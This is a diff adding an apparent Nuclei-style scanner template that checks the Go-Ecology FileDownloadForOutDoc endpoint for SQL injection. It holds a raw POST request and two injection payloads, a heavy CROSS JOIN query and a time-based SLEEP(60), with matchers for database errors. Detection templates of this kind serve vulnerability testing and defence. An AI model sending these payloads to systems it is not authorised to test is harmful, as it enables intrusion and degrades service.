@@ -1,0 +1,41 @@
+id: poc-go-ecology_filedownloadforoutdoc-sqli
+info:
+  name: Potential SQL Injection in FileDownloadForOutDoc
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects potential SQL Injection vulnerability in the FileDownloadForOutDoc endpoint of Go-Ecology application.
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=124
+
+http:
+  - raw:
+      - |
+        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: {{len(payload)}}
+
+        fileid={{payload}}&isFromOutImg=1
+
+    payloads:
+      payload:
+        - "12345%0ASELECT%20*%20FROM%20HtmlLabelInfo%20a%20CROSS%20JOIN%20HtmlLabelIndex%20b%20CROSS%20JOIN%20HtmlLabelInfo%20c"
+        - "12345%20OR%20SLEEP(60)"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "SQL syntax error"
+          - "database error"
+      - type: dsl
+        dsl:
+          - contains(http_body, "HtmlLabelInfo")
+    stop-at-first-match: true
+
+variables:
+  payload: '{{rand_text_numeric(5)}}'
